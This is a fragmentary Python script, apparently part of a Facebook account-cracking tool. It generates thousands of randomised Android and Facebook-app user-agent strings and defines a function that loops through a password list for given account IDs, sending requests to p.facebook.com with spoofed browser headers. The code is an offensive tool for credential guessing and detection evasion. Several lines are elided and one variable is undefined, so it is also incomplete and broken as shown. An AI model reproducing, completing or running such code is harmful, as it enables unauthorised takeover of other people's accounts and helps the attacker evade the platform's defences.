...
ugen=[]
ugen=[]
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO KE7 Build/QP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_BD;FBAV/410.0.0.26.115;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11.0; SM-A72 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_BD;FBAV/396.1.0.28.104;]"}
##header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/428.0.0.26.108;]"}
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android 11.0; SM-A72 Build/MRA58K; wv)'
        b=random.choice(['6','7','8','9','10','11','12',])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FBAN/EMA;FBLC/en_BD;FBAV/396.1.0.28.104;]'
...
for agent in range(10000):
        ...
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
...
def m1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        headers = {'Host': 'p.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7','cache-control': 'max-age=0','dpr': '2','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"TECNO KE7"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"10.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro}
